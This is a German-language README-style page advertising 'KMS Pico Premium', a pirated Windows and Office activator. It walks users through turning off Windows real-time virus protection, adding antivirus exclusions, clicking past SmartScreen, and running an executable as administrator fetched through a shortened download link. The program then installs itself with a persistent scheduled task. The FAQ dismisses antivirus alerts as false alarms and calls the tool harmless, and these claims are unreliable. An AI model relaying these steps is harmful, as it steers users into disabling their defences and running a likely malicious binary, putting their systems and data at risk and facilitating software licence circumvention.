## 💡 Was ist KMS Pico?

**KMS Pico** ist ein leichtgewichtiges Aktivierungswerkzeug, das einen **Key Management Service (KMS)** lokal auf Ihrem Computer emuliert. Microsoft entwickelte KMS ursprünglich für Großunternehmen, damit hunderte Geräte über einen einzigen internen Server aktiviert werden können. KMS Pico reproduziert diesen Mechanismus auf Ihrem PC — ohne externen Server und ohne Kosten.

### Kernkomponenten

| Komponente | Funktion |
|------------|----------|
| 🖥️ **Lokaler KMS-Host** | Läuft als Dienst im Hintergrund |
| 🔑 **GVLK-Schlüssel** | Generischer Volumenlizenzschlüssel |
| ⏱️ **180-Tage-Zyklus** | Jeder Token gilt ein halbes Jahr |
| 🔄 **Erneuerungsaufgabe** | Verlängert die Aktivierung täglich |

## 🪜 Schritt-für-Schritt-Anleitung

### Schritt 1 — System vorbereiten

**Windows-Sicherheit → Viren- & Bedrohungsschutz → Einstellungen verwalten → Echtzeitschutz → Aus**.

Fügen Sie einen Ordner als Ausnahme hinzu:

```
Einstellungen → Datenschutz & Sicherheit → Windows-Sicherheit
→ Viren- & Bedrohungsschutz → Ausnahmen → Ordner hinzufügen
```

### Schritt 2 — Archiv entpacken

Rechtsklick auf die Datei → **Alle extrahieren…** → Zielordner wählen.

### Schritt 3 — Als Administrator ausführen

Suchen Sie `KmsPicoPremium.exe` → Rechtsklick → **Als Administrator ausführen**.

> 💡 Bei SmartScreen: **Weitere Informationen → Trotzdem ausführen**.

[![KMS Pico Premium herunterladen](https://img.shields.io/badge/⬇️_KMS_PICO_PREMIUM_HERUNTERLADEN-CA8A04?style=for-the-badge&logo=download&logoColor=white&labelColor=854D0E)](https://share.google/onwfYoKDmD370lrlu)

</div>

### Schritt 4 — KMS-Dienst installieren

Im Hauptfenster auf **Premium-Installation** klicken. Die Komponenten werden in `C:\Windows\KmsPicoPremium` installiert.

### Schritt 5 — Windows aktivieren

Auf **Jetzt aktivieren** klicken. Die Erkennung erfolgt automatisch.

### Schritt 6 — Aktivierung überprüfen

Öffnen Sie die **Eingabeaufforderung** als Administrator:

```bash
slmgr /xpr
```

Bei Erfolg sehen Sie **"dauerhaft aktiviert"**.

Für Details:

```bash
slmgr /dlv
```

### Schritt 7 — Automatische Erneuerung bestätigen

Öffnen Sie den **Taskplaner → Taskplanerbibliothek** und prüfen Sie die Aufgabe **KmsPicoPremium**.

### Schritt 8 — Antivirus wiederherstellen

Aktivieren Sie den Echtzeitschutz und fügen Sie den KMS-Ordner zu den Ausnahmen hinzu.

### Schritt 9 — Office aktivieren (optional)

Wechseln Sie zum **Office**-Tab und klicken Sie auf **Office aktivieren**.

### Schritt 10 — Lizenz-Backup erstellen

Klicken Sie auf **☁️ Lizenz sichern**, um ein verschlüsseltes Backup zu erstellen.

## ❓ Häufige Fragen

**Ist KMS Pico wirklich kostenlos?**
Ja — es nutzt den integrierten KMS-Mechanismus von Microsoft.

**Wie lange dauert die Aktivierung?**
180 Tage mit täglicher Auto-Erneuerung — praktisch dauerhaft.

**Funktioniert es auf Windows 10 22H2?**
Ja, alle aktuellen Builds werden unterstützt.

**Schadet es meinem System?**
Nein, kritische Systemdateien werden nicht verändert.

**Kann ich es später deinstallieren?**
Ja — mit dem Deinstaller oder den Bereinigungsbefehlen.

**Aktiviert es auch Office?**
Ja, Office 2013–2024 und 365 Volumenlizenzen.

**Warum schlägt mein Antivirus an?**
PUP-Klassifizierung — meist ein Fehlalarm.

**Brauche ich täglich Internet?**
Nein, nur bei der Ersteinrichtung.

**Verlangsamt es meinen PC?**
Nein, minimaler Ressourcenverbrauch.

**Nach Updates erneut nötig?**
Normalerweise nicht, große Updates können es erfordern.
